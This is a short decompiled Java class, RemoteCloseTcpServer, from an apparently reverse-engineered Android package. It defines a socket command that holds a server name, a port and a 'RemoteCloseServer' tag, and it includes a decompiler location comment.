package com.fx.socket.command;

import com.fx.socket.TcpSocketCmd;

public class RemoteCloseTcpServer
  extends TcpSocketCmd
{
  private static String a;
  private static int b = 0;
  private static final long serialVersionUID = 371030171387996393L;
  
  public RemoteCloseTcpServer(String paramString, int paramInt)
  {
    super(null, Boolean.class);
    a = paramString;
    b = paramInt;
  }
  
  protected int getPort()
  {
    return b;
  }
  
  protected String getServerName()
  {
    return a;
  }
  
  protected String getTag()
  {
    return "RemoteCloseServer";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/socket/command/RemoteCloseTcpServer.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */